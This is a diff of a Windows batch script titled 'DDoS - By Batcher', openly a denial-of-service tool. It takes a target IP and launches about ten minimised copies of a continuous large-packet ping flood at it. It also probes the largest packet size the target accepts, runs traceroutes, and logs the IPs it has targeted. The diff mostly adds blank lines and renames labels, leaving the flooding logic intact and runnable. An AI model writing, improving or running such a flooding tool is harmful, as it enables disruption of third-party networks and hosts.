@@ -1,15 +1,19 @@
+
 mode CON: cols=90 LINES=22
 title DDoS - By Batcher                                                                                                          V.3.4
 
 if exist C:\Users\%username%\AppData\Local\Temp\DDoS\ goto skipmd
 md C:\Users\%username%\AppData\Local\Temp\DDoS\
+
 :skipmd
 cd C:\Users\%username%\AppData\Local\Temp\DDoS\
 goto init
+
 :start
 set "o= "
 DEL /F /Q /S *.bat *.dat
 color a
+
 @echo off
 cls
 echo.
@@ -59,6 +63,7 @@ call :color a " "Help" "
 call :color f " ---- "
 call :color a "For Help Page                                        " & echo.
 echo.
+
 set /p ip= Choice / IP to target:
 if %ip%==Skype goto get
 if %ip%==skype goto get
@@ -81,29 +86,34 @@ if %ip%==Help goto help
 
 call :color e "                                    Validating IP.." & echo.
 ping %ip% -l 32 -t -n 1 >> C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat -n 1
+
 >nul find "Please check the name and try again." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
   goto invalidip
 ) || (
   goto validip2
 )
+
 :validip2
 >nul find "Destination host unreachable." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
   goto invalidip
 ) || (
   goto validip3
 )
+
 :validip3
 >nul find "Request timed out." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
   goto invalidip
 ) || (
   goto validip4
 )
+
 :validip4
 >nul find "PING: transmit failed. General failure." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
   goto invalidip
 ) || (
   goto validip
 )
+
 :validip
 echo.       >> C:\Users\%username%\AppData\Local\Temp\DDoS\history.log
 echo  %date%             IP: %ip%   >> C:\Users\%username%\AppData\Local\Temp\DDoS\history.log
@@ -122,18 +132,21 @@ if %package%==f goto find
 if %package%==F goto find
 if %package%==e goto start
 if %package%==E goto start
-if %package%==%package% goto packlol
-:packlol
+if %package%==%package% goto pack
+
+:pack
 echo exit >> C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat
 echo title DDoS Assistance     >> C:\Users\%username%\AppData\Local\Temp\DDoS\DDoS-Assistance.bat
 echo ping %ip% -t -l %package% >>C:\Users\%username%\AppData\Local\Temp\DDoS\DDoS-Assistance.bat
 set "launch=1"
+
 :ddoslauncher
 start /min C:\Users\%username%\AppData\Local\Temp\DDoS\DDoS-Assistance.bat
 set /a launch=%launch% + 1
-if %launch%==10 goto lmao
+if %launch%==10 goto running
 goto ddoslauncher
-:lmao
+
+:running
 cls
 echo.
 ping %IP% -t -l %package% 
@@ -161,6 +174,7 @@ echo.
 set /p trace=https://
 if %trace%==e goto start
 if "%trace%"=="%trace%" goto trace
+
 :trace
 color a
 tracert %trace%
@@ -200,6 +214,7 @@ echo.
 set /p ip=
 if %ip%==c goto clear
 if %ip%==e goto start
+
 :clear
 del C:\Users\%username%\AppData\Local\Temp\DDoS\history.log
 goto start
@@ -212,20 +227,24 @@ echo :beginning                 >> C:\Users\%username%\AppData\Local\Temp\DDoS\P
 echo if exist C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat call C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat >> C:\Users\%username%\AppData\Local\Temp\DDoS\Package-Detector.bat
 echo goto beginning             >> C:\Users\%username%\AppData\Local\Temp\DDoS\Package-Detector.bat
 set "launch=1"
+
 :launcher
 start /min C:\Users\%username%\AppData\Local\Temp\DDoS\Package-Detector.bat
 set /a launch=%launch% + 1
 if %launch%==12 goto resetfind
 goto launcher
+
 :resetfind
 if exist C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat del C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat
 set /a package=%package% - 1000
+
 if %package%==0 goto invalidip
 echo.
 echo  Testing Package: %package%
 echo ping %ip% -l %package% -t -n 1 >> C:\Users\%username%\AppData\Local\Temp\DDoS\info.bat
 if exist C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat del C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat
 ping %ip% -l %package% -t -n 2 >> C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat -n 2
+
 >nul find "Request timed out." C:\Users\%username%\AppData\Local\Temp\DDoS\text.dat && (
   goto resetfind
 ) || (
@@ -236,6 +255,7 @@ ping %ip% -l %package% -t -n 2 >> C:\Users\%username%\AppData\Local\Temp\DDoS\te
 call :color c "                                 - IP Does Not Exist -" & echo.
 ping localhost -n 2 >NUL
 goto start
+
 
 :init
 setlocal EnableDelayedExpansion
